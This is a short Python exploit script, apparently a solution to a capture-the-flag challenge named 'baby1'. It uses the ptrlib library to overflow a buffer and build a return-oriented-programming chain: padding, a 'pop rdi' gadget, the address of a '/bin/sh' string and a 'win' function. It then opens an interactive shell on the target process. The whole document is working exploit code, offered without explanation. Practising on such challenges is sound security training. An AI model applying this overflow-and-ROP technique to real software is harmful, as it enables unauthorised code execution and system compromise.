from ptrlib import *

elf = ELF("./baby1")
sock = Process("./baby1")
rop_pop_rdi = 0x00400793

payload = b"A" * 0x18
payload += p64(rop_pop_rdi)
payload += p64(0x400000 + next(elf.find("/bin/sh")))
payload += p64(elf.symbol("win") + 1)
sock.sendline(payload)

sock.interactive()
